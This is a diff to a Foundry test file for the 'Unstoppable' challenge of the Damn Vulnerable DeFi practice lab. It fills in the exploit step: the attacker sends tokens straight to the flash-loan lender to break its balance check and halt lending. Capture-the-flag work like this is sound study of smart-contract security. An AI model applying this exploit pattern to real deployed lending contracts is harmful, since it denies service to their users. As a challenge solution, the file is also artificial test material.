@@ -18,6 +18,7 @@ contract Unstoppable is Test {
     DamnValuableToken internal dvt;
     address payable internal attacker;
     address payable internal someUser;
+    ReceiverUnstoppable internal attackReceiverUnstoppable;
 
     function setUp() public {
         /**
@@ -57,9 +58,14 @@ contract Unstoppable is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
+        vm.startPrank(attacker);
+        //attackReceiverUnstoppable = new ReceiverUnstoppable(address(unstoppableLender));
+        // attackReceiverUnstoppable.executeFlashLoan(10);
+        dvt.approve(attacker, 10); //approve
+        dvt.transferFrom(attacker, address(unstoppableLender), 10);
+
+        vm.stopPrank();
+        //console.log("owner :  ");
         /**
          * EXPLOIT END *
          */
